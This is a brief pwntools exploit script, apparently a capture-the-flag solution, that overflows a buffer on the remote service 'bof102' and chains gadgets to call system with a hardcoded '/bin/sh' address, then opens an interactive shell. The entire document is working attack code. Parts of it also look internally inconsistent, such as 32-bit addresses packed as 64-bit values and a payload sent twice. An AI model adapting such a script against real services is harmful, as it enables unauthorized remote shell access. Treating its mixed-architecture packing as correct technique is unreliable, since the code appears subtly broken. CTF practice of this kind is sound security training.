from pwn import *
	
r = remote("bof102.sstf.site",1337)
e = ELF("./bof102")

system_plt = e.plt["system"]
binsh = 0xf7f370f5
ret = 0x0804837e
pop_edi_ebp = 0x0804864a

payload = b"A"*0x10

r.sendline(payload)

payload += b"B"*0x4
payload += p64(ret)
payload += p64(pop_edi_ebp)
payload += p64(binsh) + p64(0)
payload += p64(system_plt)

r.sendline(payload)
r.interactive()
